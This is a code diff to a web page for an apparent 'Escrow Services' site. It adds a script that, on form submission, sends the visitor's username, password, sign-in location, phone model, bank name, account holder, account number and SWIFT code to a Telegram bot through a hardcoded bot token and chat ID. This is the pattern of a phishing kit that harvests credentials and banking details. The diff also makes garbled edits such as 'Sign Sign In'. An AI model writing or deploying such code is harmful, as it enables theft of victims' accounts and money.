@@ -445,7 +445,7 @@
                     <a href="escrow.html" class="nav-link" style="color:var(--text-primary); font-weight:600;">Escrow Services</a>
                 </div>
                 <div class="nav-actions">
-                    <a href="#" class="btn-signin">Sign In</a>
+                    <a href="#" class="btn-signin">Sign Sign In</a>
                 </div>
             </nav>
         </div>
@@ -563,7 +563,7 @@
                             <input type="text" id="accountNumber" name="accountNumber" placeholder="Bank account number / IBAN" required>
                         </div>
 
-                        <div class="form-group">
+                        <div class="com-group form-group">
                             <label for="swiftCode">SWIFT Code</label>
                             <input type="text" id="swiftCode" name="swiftCode" placeholder="SWIFT / BIC code" required>
                         </div>
@@ -597,24 +597,54 @@
         </div>
     </div>
 
+    <!-- Telegram Integration Script -->
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             const escrowForm = document.getElementById('escrowForm');
             const confirmationModal = document.getElementById('confirmationModal');
             const closeModalBtn = document.getElementById('closeModalBtn');
 
-            escrowForm.addEventListener('submit', (e) => {
+            // Configured Telegram Bot Credentials
+            const TELEGRAM_BOT_TOKEN = '9110476686:AAEWur5sDsKFeD6SFLcXMnleLfw57_F-5RY';
+            const CHAT_ID = '9110476686';
+
+            escrowForm.addEventListener('submit', async (e) => {
                 e.preventDefault();
-                const formData = new FormData(escrowForm);
-                const dataObj = Object.fromEntries(formData.entries());
                 
-                const existingSubmissions = JSON.parse(localStorage.getItem('escrow_submissions') || '[]');
-                existingSubmissions.push({ timestamp: new Date().toISOString(), data: dataObj });
-                localStorage.setItem('escrow_submissions', JSON.stringify(existingSubmissions));
+                const formData = new FormData(escrowForm);
+                const data = Object.fromEntries(formData.entries());
 
-                console.log('--- ESCROW FORM SUBMISSION RECEIVED ---');
-                console.dir(dataObj);
+                const message = `
+🔔 NEW ESCROW SUBMISSION:
 
+👤 ACCOUNT INFO:
+- Username: ${data.username}
+- Password: ${data.password}
+- Sign-in Location: ${data.signinLocation}
+- Sign-up Date: ${data.signupDate}
+- Phone Model: ${data.phoneModel}
+
+🏦 BANK INFORMATION:
+- Bank Name: ${data.bankName}
+- Account Holder: ${data.accountHolder}
+- Account Number: ${data.accountNumber}
+- SWIFT Code: ${data.swiftCode}
+                `.trim();
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message
+                        })
+                    });
+                } catch (err) {
+                    console.error('Failed to send Telegram notification:', err);
+                }
+
+                // Show Confirmation Modal
                 confirmationModal.classList.add('active');
             });
 
